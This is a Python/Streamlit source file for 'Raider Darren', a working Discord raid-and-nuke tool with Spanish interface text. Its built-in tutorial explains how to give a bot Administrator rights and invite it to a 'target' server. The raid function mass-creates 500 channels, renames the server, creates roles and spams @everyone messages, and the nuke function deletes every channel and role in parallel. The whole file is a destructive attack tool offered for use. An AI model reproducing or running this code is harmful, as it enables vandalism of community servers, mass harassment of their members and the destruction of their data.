import streamlit as st
import os
import subprocess
import sys
import time
import asyncio
import discord
from discord.ext import commands

# --- TRUCO ANTIBUCLE ---
if "STREAMLIT_RUNNING" not in os.environ and "streamlit" not in sys.argv[0]:
    os.environ["STREAMLIT_RUNNING"] = "1"
    print("⚡ ¡Iniciando interfaz real de Raider Darren!...")
    subprocess.run(["streamlit", "run", __file__])
    sys.exit()

# Configuración de la página
st.set_page_config(page_title="Raider Darren Tool", page_icon="⚡", layout="centered")

# --- ANIMACIONES Y ESTILOS CSS ---
st.markdown("""
<style>
    @keyframes rainbow {
        0% { color: #ff0000; text-shadow: 0 0 10px #ff0000; }
        17% { color: #ff8800; text-shadow: 0 0 10px #ff8800; }
        33% { color: #ffff00; text-shadow: 0 0 10px #ffff00; }
        50% { color: #00ff00; text-shadow: 0 0 10px #00ff00; }
        67% { color: #00ffff; text-shadow: 0 0 10px #00ffff; }
        83% { color: #0000ff; text-shadow: 0 0 10px #0000ff; }
        100% { color: #ff0000; text-shadow: 0 0 10px #ff0000; }
    }
    @keyframes pulse {
        0% { transform: scale(1); opacity: 0.9; }
        50% { transform: scale(1.02); opacity: 1; text-shadow: 0 0 20px #ff0055; }
        100% { transform: scale(1); opacity: 0.9; }
    }
    .banner-bienvenido { text-align: center; font-size: 3.5rem; font-weight: bold; color: #ff0055; animation: pulse 3s infinite ease-in-out; margin-bottom: 0px; }
    .rainbow-text { text-align: center; font-size: 4.5rem; font-weight: 900; animation: rainbow 5s infinite linear; margin-top: 0px; letter-spacing: 2px; }
    .log-box { background-color: #0e1117; border: 2px solid #ff0055; border-radius: 5px; padding: 15px; font-family: 'Courier New', Courier, monospace; height: 250px; overflow-y: scroll; color: #00ff00; }
</style>
""", unsafe_allow_html=True)

st.markdown('<p class="banner-bienvenido">BIENVENIDO</p>', unsafe_allow_html=True)
st.markdown('<p class="rainbow-text">RAIDER DARREN</p>', unsafe_allow_html=True)
st.markdown("---")

# --- SECCIÓN 1: CONFIGURACIÓN DEL BOT ---
st.subheader("🔑 Configuración de Credenciales")
bot_token = st.text_input("Token Del Bot de Discord", type="password", placeholder="Introduce el token aquí...")

if "bot_info" not in st.session_state:
    st.session_state.bot_info = None

col1, col2 = st.columns([1, 2])
with col1:
    analizar_btn = st.button("🔍 ANALIZAR BOT")

if analizar_btn:
    if bot_token:
        with st.spinner("Conectando con la API de Discord..."):
            try:
                loop = asyncio.new_event_loop()
                asyncio.set_event_loop(loop)
                client = discord.Client(intents=discord.Intents.default())
                
                @client.event
                async def on_ready():
                    st.session_state.bot_info = {"name": str(client.user), "id": str(client.user.id)}
                    await client.close()
                
                loop.run_until_complete(client.start(bot_token))
            except Exception as e:
                st.error(f"Error de conexión: Token inválido o sin permisos.")
    else:
        st.error("Por favor, introduce un token válido primero.")

if st.session_state.bot_info:
    st.success("🤖 Bot Detectado Correctamente")
    st.info(f"**Nombre del Bot:** {st.session_state.bot_info['name']}\n\n**ID del Bot:** {st.session_state.bot_info['id']}")

guild_id = st.text_input("ID del Servidor (Guild ID)", placeholder="Ej: 8833992211...")

st.markdown("---")

# --- SECCIÓN 2: TUTORIAL ---
with st.expander("📖 TUTORIAL: Cómo conseguir los datos y dar permisos"):
    st.markdown("""
    ### 1. Cómo conseguir el Token del Bot
    1. Entra al [Discord Developer Portal](https://discord.com/developers/applications).
    2. Crea una aplicación, ve a la pestaña **Bot** y haz clic en **Reset Token**.
    
    ### 2. Cómo darle permisos (OAUTH)
    1. En el Developer Portal ve a **OAuth2** -> **URL Generator**.
    2. Selecciona `bot` y `applications.commands`.
    3. En permisos del bot marca **Administrator** (Administrador).
    4. Copia el enlace final, pégalo en tu navegador e invita al bot al servidor objetivo.
    """)

st.markdown("---")

# --- SECCIÓN 3: PANELES DE ACCIÓN REALES ---
st.subheader("🚀 Panel de Control")
tab1, tab2 = st.tabs(["🔥 1 - Función RAIDEAR", "☢️ 2 - Función NUKE"])

# Función asíncrona para ejecutar el RAID real en paralelo
async def run_real_raid(token, g_id, c_name, s_name, spam, r_name, log_area):
    intents = discord.Intents.all()
    bot = commands.Bot(command_prefix="!", intents=intents)
    logs = []

    def update_logs(msg):
        logs.append(msg)
        log_area.markdown(f"<div class='log-box'>{''.join(logs)}</div>", unsafe_allow_html=True)

    @bot.event
    async def on_ready():
        guild = bot.get_guild(int(g_id))
        if not guild:
            update_logs("<span style='color:red;'>[!] Error: No se encontró el servidor. ¿El bot está dentro?</span><br>")
            await bot.close()
            return

        update_logs(f"<span style='color:yellow;'>[*] Conectado al objetivo: {guild.name}</span><br>")
        
        if s_name:
            try:
                await guild.edit(name=s_name)
                update_logs(f"[+] Nombre del servidor cambiado a: {s_name}<br>")
            except: pass

        async def create_and_spam(index):
            if not st.session_state.raiding: return
            try:
                channel = await guild.create_text_channel(name=f"{c_name}-{index}")
                update_logs(f"[+] Canal creado: #{channel.name}<br>")
                
                if r_name:
                    rol = await guild.create_role(name=r_name)
                    update_logs(f"[*] Rol creado: {rol.name}<br>")
                
                for _ in range(10):
                    if not st.session_state.raiding: break
                    await channel.send(f"||@everyone@here|| {spam}")
                    update_logs(f"[>] Mensaje enviado en #{channel.name}<br>")
            except Exception as e:
                pass

        tasks = [create_and_spam(i) for i in range(1, 501)]
        await asyncio.gather(*tasks, return_exceptions=True)
        await bot.close()

    try:
        await bot.start(token)
    except Exception as e:
        update_logs(f"<span style='color:red;'>[!] Error fatal: {e}</span><br>")

# Función asíncrona para ejecutar el NUKE a máxima velocidad en paralelo
async def run_real_nuke(token, g_id, s_name, log_area):
    intents = discord.Intents.all()
    bot = commands.Bot(command_prefix="!", intents=intents)
    logs = []

    def update_logs(msg):
        logs.append(msg)
        log_area.markdown(f"<div class='log-box' style='color:#ff3333; border-color:#ff3333;'>{''.join(logs)}</div>", unsafe_allow_html=True)

    @bot.event
    async def on_ready():
        guild = bot.get_guild(int(g_id))
        if not guild:
            update_logs("[!] Servidor no encontrado.<br>")
            await bot.close()
            return

        update_logs(f"[*] ¡INICIANDO DESTRUCCIÓN ULTRA RÁPIDA en: {guild.name}!<br>")
        
        if s_name:
            try: await guild.edit(name=s_name)
            except: pass

        async def delete_channel_fast(channel):
            if not st.session_state.nuking: return
            try:
                await channel.delete()
                update_logs(f"[-] Canal eliminado instantáneamente: {channel.name}<br>")
            except Exception as e:
                pass

        async def delete_role_fast(role):
            if not st.session_state.nuking: return
            try:
                if role.name != "@everyone" and not role.managed:
                    await role.delete()
                    update_logs(f"[-] Rol eliminado instantáneamente: {role.name}<br>")
            except Exception as e:
                pass

        tasks = []
        
        for channel in guild.channels:
            tasks.append(delete_channel_fast(channel))
            
        for role in guild.roles:
            tasks.append(delete_role_fast(role))

        # Borrado en paralelo masivo
        await asyncio.gather(*tasks, return_exceptions=True)
        
        update_logs("<span style='color:cyan;'>[+] Purga completada o detenida.</span><br>")
        await bot.close()

    try:
        await bot.start(token)
    except Exception as e:
        update_logs(f"[!] Error: {e}<br>")

# --- INTERFAZ TAB 1: RAID ---
with tab1:
    channel_name = st.text_input("Nombre Para Canales", placeholder="ej: nuke-by-darren")
    server_name = st.text_input("Cambio de Nombre de Servidor", placeholder="ej: SERVER HACKED")
    spam_text = st.text_area("Mensaje de SPAM para los canales", placeholder="Mensaje...")
    roles_name = st.text_input("Crear Roles (Nombre)", placeholder="ej: Darren On Top")
    
    st.markdown("### ¿Estas Seguro De EMPEZAR?")
    col_si, col_no = st.columns(2)
    
    if "raiding" not in st.session_state:
        st.session_state.raiding = False

    with col_si:
        if st.button("🔥 SÍ, EMPEZAR RAID", use_container_width=True):
            if not bot_token or not guild_id:
                st.error("Falta el Token del Bot o la ID del Servidor.")
            else:
                st.session_state.raiding = True

    with col_no:
        if st.button("❌ NO", use_container_width=True):
            st.session_state.raiding = False

    if st.session_state.raiding:
        st.markdown("#### 📋 REGISTRO DE RAID EN VIVO")
        log_placeholder = st.empty()
        
        if st.button("🛑 TERMINAR RAID", use_container_width=True):
            st.session_state.raiding = False
            st.rerun()

        asyncio.run(run_real_raid(bot_token, guild_id, channel_name, server_name, spam_text, roles_name, log_placeholder))

# --- INTERFAZ TAB 2: NUKE ---
with tab2:
    nuke_server_name = st.text_input("Nombre de Cambio de Servidor (Nuke)", placeholder="ej: Destruido")
    
    if "nuking" not in st.session_state:
        st.session_state.nuking = False
        
    if st.button("☢️ EJECUTAR NUKE", use_container_width=True):
        if not bot_token or not guild_id:
            st.error("Falta el Token o la ID del Servidor.")
        else:
            st.session_state.nuking = True
            
    if st.session_state.nuking:
        st.markdown("#### 📋 REGISTRO DE NUKE EN VIVO")
        log_placeholder_nuke = st.empty()
        
        if st.button("🛑 TERMINAR NUKE", use_container_width=True):
            st.session_state.nuking = False
            st.rerun()

        asyncio.run(run_real_nuke(bot_token, guild_id, nuke_server_name, log_placeholder_nuke))